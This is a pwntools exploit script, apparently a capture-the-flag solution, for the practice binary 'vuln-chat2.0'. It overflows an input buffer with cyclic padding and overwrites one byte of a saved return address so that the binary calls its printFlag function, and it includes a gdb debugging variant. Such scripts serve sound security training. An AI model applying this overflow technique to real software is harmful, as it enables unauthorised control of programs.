#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-05-17 08:32:00
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p8

context.arch = "i386"
filename = "./vuln-chat2.0"
target = process(filename)


# printFlag @ 0x08048672
# return address to overwrite is 0x8048668
# we need to overwrite 0x68 with 0x72
def exploit():
	print(target.recvuntil("username: "))
	
	username = b"dahir"
	target.sendline(username)
	print(target.recvuntil(username + b":"))
	
	trash = cyclic(0x2d - 2)
	payload = trash + p8(0x72)

	target.send(payload)

	target.interactive()



def debug():
	script = """
	break *0x08048603
	"""

	gdb.attach(target, gdbscript=script)

	print(target.recvuntil("username: "))
	
	username = b"dahir"
	target.sendline(username)
	print(target.recvuntil(username + b":"))
	
	trash = cyclic(0x2d - 2)
	payload = trash + p8(0x72)

	target.send(payload)


if __name__ == '__main__':
	exploit()

